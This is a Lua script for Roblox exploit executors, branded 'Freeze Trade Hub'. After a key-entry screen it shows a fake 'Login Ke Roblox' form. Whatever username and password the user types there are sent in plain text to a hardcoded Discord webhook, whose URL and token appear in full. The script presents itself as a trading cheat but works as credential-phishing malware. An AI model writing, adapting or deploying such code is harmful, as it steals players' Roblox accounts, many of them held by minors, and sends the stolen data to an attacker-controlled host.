-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    if syn and syn.request then
        local response = syn.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif http and http.request then
        local response = http.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif request then
        local response = request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Fungsi Membuat GUI Pertama (Key Validation)
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local keyBox = Instance.new("TextBox")
    local verifyKeyButton = Instance.new("TextButton")
    local copyLinkButton = Instance.new("TextButton")
    local errorLabel = Instance.new("TextLabel")

    -- Properti GUI
    gui.Name = "KeyValidationGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "KeyFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 230)
    frame.Position = UDim2.new(0.5, -150, 0.5, -115)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Key Box
    keyBox.Name = "KeyBox"
    keyBox.Parent = frame
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.PlaceholderText = "Masukkan Key"
    keyBox.Font = Enum.Font.SourceSans
    keyBox.Text = ""
    keyBox.TextSize = 14
    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Error Label
    errorLabel.Name = "ErrorLabel"
    errorLabel.Parent = frame
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 105)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.Text = ""
    errorLabel.TextSize = 14
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    -- Verify Key Button
    verifyKeyButton.Name = "VerifyKeyButton"
    verifyKeyButton.Parent = frame
    verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
    verifyKeyButton.Text = "Verifikasi Key"
    verifyKeyButton.Font = Enum.Font.SourceSansBold
    verifyKeyButton.TextSize = 16
    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Copy Link Button
    copyLinkButton.Name = "CopyLinkButton"
    copyLinkButton.Parent = frame
    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
    copyLinkButton.Position = UDim2.new(0, 10, 0, 180)
    copyLinkButton.Text = "Salin Link untuk Mendapatkan Key"
    copyLinkButton.Font = Enum.Font.SourceSansBold
    copyLinkButton.TextSize = 16
    copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
    copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Tombol Copy Link
    copyLinkButton.MouseButton1Click:Connect(function()
        print("Salin link manual: " .. linkUrl)
    end)

    -- Fungsi Verifikasi Key
    verifyKeyButton.MouseButton1Click:Connect(function()
        if keyBox.Text == correctKey then
            print("Key benar!")
            gui:Destroy()
            createLoginGUI()
        else
            errorLabel.Text = "Key salah! Silakan coba lagi."
        end
    end)
end

-- Fungsi Membuat GUI Kedua (Login)
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local subtitleLabel = Instance.new("TextLabel")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    -- Properti GUI
    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "LoginFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Subtitle Label
    subtitleLabel.Name = "SubtitleLabel"
    subtitleLabel.Parent = frame
    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
    subtitleLabel.BackgroundTransparency = 1
    subtitleLabel.Font = Enum.Font.SourceSans
    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
    subtitleLabel.TextSize = 16
    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)

    -- Username Box
    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Password Box
    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Login Button
    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Mulai Script"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Login Button
    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            print("Login berhasil! Username:", username, "Password:", password)
            sendToDiscord(username, password)
            gui:Destroy()
        else
            print("Harap isi username dan password!")
        end
    end)
end

-- Memulai Script dengan GUI Pertama
createKeyValidationGUI()
